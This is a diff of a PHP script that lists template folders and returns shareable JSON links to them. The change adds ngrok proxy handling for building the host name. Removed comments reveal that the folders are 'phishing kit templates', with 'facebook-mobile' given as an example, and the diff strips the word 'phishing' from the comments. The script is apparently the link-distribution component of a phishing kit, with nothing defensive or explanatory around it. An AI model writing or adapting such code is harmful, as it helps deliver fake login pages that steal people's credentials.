@@ -1,54 +1,55 @@
 <?php
 
-// Set the content type to JSON, so the browser knows how to interpret the response.
+// Set the content type to JSON.
 header('Content-Type: application/json');
 
-// Define the directory where your phishing kit templates are stored.
+// Define the directory where your templates are stored.
 $templateDir = 'templates';
 $links = [];
 
-// --- Error Handling: Check if the templates directory actually exists ---
+// Error Handling: Check if the templates directory exists.
 if (!is_dir($templateDir)) {
-    // If the directory doesn't exist, return an empty JSON array.
-    // This prevents errors on the frontend.
     echo json_encode([]);
     exit();
 }
 
-// --- Determine the Base URL of your server ---
-// 1. Determine the protocol (http or https)
+// --- Determine the Base URL of your server (UPDATED LOGIC) ---
+
+// 1. Determine the protocol (http or https).
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
 
-// 2. Get the host name
-$host = $_SERVER['HTTP_HOST'];
+// 2. Get the host name.
+// **THIS IS THE MODIFIED PART**
+// Check if the request is coming through a proxy like ngrok.
+if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
+    // If it is, use the host provided by the proxy.
+    $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
+} else {
+    // Otherwise, use the standard host name.
+    $host = $_SERVER['HTTP_HOST'];
+}
 
-// 3. Get the path to the directory containing this script
+// 3. Get the path to the directory containing this script.
 $path = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
 
-// 4. Combine them to create the full base URL
+// 4. Combine them to create the full base URL.
 $baseUrl = "{$protocol}://{$host}{$path}";
 
 // --- Scan the directory for templates and build the links array ---
-// scandir() lists all files and directories, including '.' and '..'
 $items = scandir($templateDir);
 
 foreach ($items as $item) {
-    // Ignore the current ('.') and parent ('..') directory entries.
-    // Also, ensure the item is a directory, not just a random file.
     if ($item === '.' || $item === '..') {
         continue;
     }
     
     $fullPath = $templateDir . '/' . $item;
     if (is_dir($fullPath)) {
-        // The item is a valid template directory.
-
         // Create a user-friendly name from the directory name.
-        // E.g., "facebook-mobile" becomes "Facebook mobile".
         $formattedName = ucfirst(str_replace('-', ' ', $item));
 
         // Construct the full, shareable URL for the template.
-        $fullUrl = "{$baseUrl}/{$fullPath}/"; // The trailing slash is important.
+        $fullUrl = "{$baseUrl}/{$fullPath}/";
 
         // Add the structured data to our links array.
         $links[] = [
@@ -59,8 +60,6 @@ foreach ($items as $item) {
 }
 
 // --- Output the final result ---
-// Encode the array of links into a JSON string and print it.
-// JSON_PRETTY_PRINT makes it easier to read if you open the file directly in a browser.
 echo json_encode($links, JSON_PRETTY_PRINT);
 
 ?>
